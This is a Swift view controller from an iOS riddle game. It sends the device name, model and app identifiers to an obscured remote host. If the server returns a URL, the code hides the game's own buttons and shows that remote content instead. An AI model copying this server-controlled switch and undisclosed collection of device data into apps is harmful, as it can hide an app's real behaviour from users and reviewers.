//
//  ViewController.swift
//  RiddleSpireMatrix
//
//  Created by RiddleSpireMatrix on 03/02/25.
//

import UIKit

class MatrixEnterViewController: UIViewController , UNUserNotificationCenterDelegate{

    @IBOutlet weak var enterBtn: UIButton!
    @IBOutlet weak var titleBtn: UIButton!
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        
        riddleSpireStartPushPrmission()
        self.riddleSpireNeedShowAdsLocalData()
    }
    
    func riddleSpireStartPushPrmission() {
        UNUserNotificationCenter.current().delegate = self
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(
          options: authOptions,
          completionHandler: { _, _ in }
        )
        UIApplication.shared.registerForRemoteNotifications()
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print(userInfo)
        completionHandler([[.sound]])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print(userInfo)
        completionHandler()
    }

    private func riddleSpireNeedShowAdsLocalData() {
        guard self.riddleSpireNeedShowAdsView() else {
            return
        }
        self.enterBtn.isHidden = true
        self.titleBtn.isHidden = true
        riddleSpirePostGetAdsData { adsData in
            if let adsData = adsData {
                if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                    UIViewController.riddleSpireSetUserDefaultKey(userDefaultKey)
                    if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                        self.riddleSpireShowAdView(locDic[2] as! String)
                    } else {
                        UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                        self.riddleSpireShowAdView(adsUr)
                    }
                    return
                }
            }
            self.enterBtn.isHidden = false
            self.titleBtn.isHidden = false
        }
    }
    
    private func riddleSpirePostGetAdsData(completion: @escaping ([Any]?) -> Void) {
        
        let url = URL(string: "https://open.bqzlwmxf\(self.riddleSpireMainHostUrl())/open/riddleSpirePostGetAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "riddleSpireAppDeviceName": UIDevice.current.name,
            "riddleSpireAppLocalized": UIDevice.current.localizedModel ,
            "appKey": "2bda13abdcf64188a4111e7adfa65980",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                            completion(adsData)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }


}
